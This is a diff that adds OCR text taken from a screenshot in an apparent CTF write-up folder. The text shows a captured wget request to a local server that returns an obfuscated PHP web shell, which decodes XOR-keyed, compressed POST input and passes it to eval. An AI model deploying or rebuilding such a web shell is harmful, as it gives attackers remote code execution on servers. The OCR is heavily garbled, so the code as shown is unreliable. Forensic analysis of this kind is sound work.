@@ -1,0 +1,27 @@
+# OCR: ec1f670e0c06a8fbd14b630517091a8c.webp
+# 来源: .\02-WriteUp\2024\ec1f670e0c06a8fbd14b630517091a8c.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:20
+
+GET /help.php HTTP/1.1
+User-Agent: Wget/1.13.4 (linux-gnu)
+Accept: */*
+Host: 192.168.75.132:2000
+Connection: Keep-Alive
+HTTP/1.0 200 OK
+Server: SimpleHTTP/@.6 Python/3.11.8
+Date: Wed, 31 Jul 2024 07:03:35 GMT
+Content-type: application/octet-stream
+Content-Length: 771
+Last-Modified: Wed, 31 Jul 2024 07:00:33 GMT
+<?php
+uvlo2g6mkn7y";fvlunctiviovin x(v1$t, $k) {$c=vistrlen(v1$k)v1;v1$l=strlenv1 ($t) ;$0" 5
+tents (v1"php: //ivinput"),$vimv1)==1) {@ov1b_start() ;vi@evival (@vigzuncomvipress(@x(@';
+k="c6vlaelev170" ; $khvi="cbbf9v1691e009" ; v1$vikv1f="85a8v19e92c410" ; $p="dv1zINviRg' ;
+jforv1 ($10; $vliviv1<$1; ){Fv1vlor ($5=0; ($4<$c8&$i<$1V1) ;$5++, $1++)V1{V1$0.=vISt{$i}"' 5
+‘tr_replace(‘cM','', 'cMcreacMte_cMfcMunccMcMtion');
+$k{$j}v1v1;}}return vigo;v1}if (@pregv1_vimatch("/vi$kh(.+)vivi$kf/",@v1fvlile_get_covin';
+leanv1() ;$r=@base6v14_evincviode(v1@x(@gzcovimpress($ov1) , $v1kv1)) ;printv1("$p$kh$r$k#");}"5
+vibasev164_decodev1 ($mv1[v11]) ,$v1k)));$0-@ovlb_get_contevints(viv1) ;@ob_envid_c';
+tr_replace(‘v1','',$A.$q.$0.$Q.$k.$w.$Z) ;
+=$D("",$S)3$C()5
